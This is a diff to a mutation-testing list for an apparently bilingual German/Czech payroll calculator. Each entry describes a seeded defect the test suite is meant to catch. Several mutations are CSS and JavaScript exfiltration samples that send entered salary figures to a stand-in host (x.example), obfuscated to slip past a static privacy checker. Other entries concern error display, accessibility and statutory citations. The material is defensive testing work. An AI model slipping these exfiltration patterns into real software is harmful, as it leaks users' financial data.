@@ -266,8 +266,8 @@ const MUTATIONS = [
       'RESULT.empty speaks only about the gross. Rendering it for ANY unreadable field told a reader with a valid ' +
       'gross to enter a gross, naming the one field that was correct.',
     file: COMPONENT,
-    from: "              parsed.errors.length === 0 ? (",
-    to: "              true ? (",
+    from: "            {problems.length > 0 ? (",
+    to: "            {false ? (",
   },
   {
     name: '29. a wrong statutory citation restored',
@@ -380,9 +380,9 @@ const MUTATIONS = [
       'that style it were never inspected. An attribute selector paired with a background-image exfiltrates a ' +
       'figure digit by digit, and neither file looks wrong on its own.',
     file: STYLES,
-    from: '.ecc--de .ecc__table-wrap { overflow-x: auto; max-width: 100%; }',
+    from: '.ecc--de .ecc__table-wrap { max-width: 100%; }',
     to:
-      '.ecc--de .ecc__table-wrap { overflow-x: auto; max-width: 100%; }\n' +
+      '.ecc--de .ecc__table-wrap { max-width: 100%; }\n' +
       '.pcalc__grid [data-net^="1"] { background-image: url(https://x.example/1); }',
   },
   {
@@ -402,8 +402,8 @@ const MUTATIONS = [
       'below 100 million euro." appeared alone with four monthly amounts on screen — one branch away from the ' +
       'defect the parse-side fix was written to answer.',
     file: COMPONENT,
-    from: "                    <strong>{tr(ISSUE_FIELD[i.field] ?? FIELD.gross)}:</strong>{' '}\n",
-    to: '',
+    from: "                    <strong>{tr(p.field)}:</strong> {tr(p.text)}",
+    to: "                    {tr(p.text)}",
   },
   {
     name: '36. the Kurzarbeit refusal telling a Czech reader the labour agency pays part',
@@ -441,6 +441,93 @@ const MUTATIONS = [
     file: CS_PAGE,
     from: 'krátkodobé zaměstnání, učně, dobrovolnickou službu, ',
     to: '',
+  },
+  // ── Round six. The privacy gate's own model was the target this time, and
+  // three of these passed 1 204 assertions on the previous candidate.
+  {
+    name: '40. a bracketed style write, which CSSOM forwards to cssText',
+    why:
+      'The property pin was `used minus declared`, and `declared` was a closure-wide bag fed by every ' +
+      'object-literal key in nineteen files — so `style: \'currency\'`, an option handed to Intl.NumberFormat, ' +
+      'authorized `x[\'style\']`. The assignment sets the whole inline style and issues a real request.',
+    file: COMPONENT,
+    from: "onChange={(e) => set('gross')(e.target.value)}",
+    to:
+      "onChange={(e) => { e.target['style'] = 'back' + 'ground:u' + 'rl(' + '/' + '/x.example/' + " +
+      "e.target.value + ')'; set('gross')(e.target.value) }}",
+  },
+  {
+    name: '41. a capability lifted out by destructuring',
+    why:
+      'A destructuring pattern used to add the property name to the DECLARED side and nothing to the used ' +
+      'side, so `const { fetch: send } = self` extracted a capability without any checked name appearing. ' +
+      'Destructuring is a property read, and is counted as one.',
+    file: COMPONENT,
+    from: "onChange={(e) => set('gross')(e.target.value)}",
+    to:
+      "onChange={(e) => { const { style: css } = e.target; css.backgroundImage = 'ur' + 'l(/r/' + " +
+      "e.target.value + ')'; set('gross')(e.target.value) }}",
+  },
+  {
+    name: '42. a global recovered by shadowing its name somewhere else in the file',
+    why:
+      'Scope resolution was flat per file: one unused `.map((k, document) => …)` parameter made `document` ' +
+      'local for the whole file, and a plain `document[\'title\']` write three hundred lines away never ' +
+      'entered the free set. Real scoping catches it AND breaks it, because a name that shadows the global ' +
+      'no longer holds the global.',
+    file: COMPONENT,
+    from: "{STEUERKLASSEN.map((k) => (",
+    to:
+      "{STEUERKLASSEN.map((k, document) => (\n                        <option key={k} value={k}>{document}</option>\n                      )).slice(0, 0).concat(STEUERKLASSEN.map((k) => (",
+  },
+  {
+    name: '43. a JSX style prop, previously visible only to the textual rules',
+    why:
+      'JSX attribute names are property writes on a node. Counting them keeps `style={{ backgroundImage }}` ' +
+      'and `data-net={net}` inside the structural proof instead of leaving that family to a substring match.',
+    file: COMPONENT,
+    from: "onChange={(e) => set('gross')(e.target.value)}",
+    to: "onChange={(e) => set('gross')(e.target.value)} style={{ backgroundImage: 'ur' + 'l(/r/' + gross + ')' }}",
+  },
+  {
+    name: '44. the two error layers made mutually exclusive again',
+    why:
+      'One unreadable field nulled the outcome, so validateDeInput never ran on the fields that DID parse: ' +
+      'with a bad accident amount, a 99 % Zusatzbeitrag and 25 children entered at once, the reader saw one ' +
+      'message and the other two appeared nowhere on the page.',
+    file: COMPONENT,
+    from: "        ? validateDeInput(candidate)",
+    to: "        ? []",
+  },
+  {
+    name: '45. the messages detached from the controls they are about',
+    why:
+      'Not one input carried aria-invalid or aria-describedby, so a screen-reader user sitting on the ' +
+      'offending control was told nothing: the messages lived in a separate region with no programmatic ' +
+      'relationship to the field at fault.',
+    file: COMPONENT,
+    from: "                    aria-describedby={errorId('gross')}\n",
+    to: '',
+  },
+  {
+    name: '46. the wrong statutory rate behind the Vorsorgepauschale constant',
+    why:
+      '0,07 is half of the ERMÄSSIGTER Beitragssatz of 14,0 % (§ 243 SGB V). The allgemeiner Beitragssatz is ' +
+      '14,6 % (§ 241 SGB V) and its half is 0,073. Anlage 1 of this very PAP names § 243 expressly, and ' +
+      'rules.ts warns that confusing the two understates every employee\'s health contribution by 0,3 points.',
+    file: PAP,
+    from: "The 0,07 is half of the ERMÄSSIGTER Beitragssatz of 14,0 %",
+    to: "The 0,07 is the employee's half of the 14 % allgemeiner Beitragssatz, per",
+  },
+  {
+    name: '47. the Baugewerbe refusal calling a federal ordinance a collective agreement',
+    why:
+      '§ 3 WinterbeschV fixes the Winterbeschäftigungs-Umlage rates nationally by Rechtsverordnung. Saying ' +
+      'both levies are "tarifvertraglich geregelt … nicht gesetzlich einheitlich" was false of one of them, ' +
+      'in German and English only — the Czech text made no such claim.',
+    file: UNSUPPORTED,
+    from: "Die Umlagesätze stehen in § 3 WinterbeschV und gelten bundesweit;",
+    to: "Beide sind tarifvertraglich geregelt und branchenabhängig, nicht gesetzlich einheitlich;",
   },
 ]
 
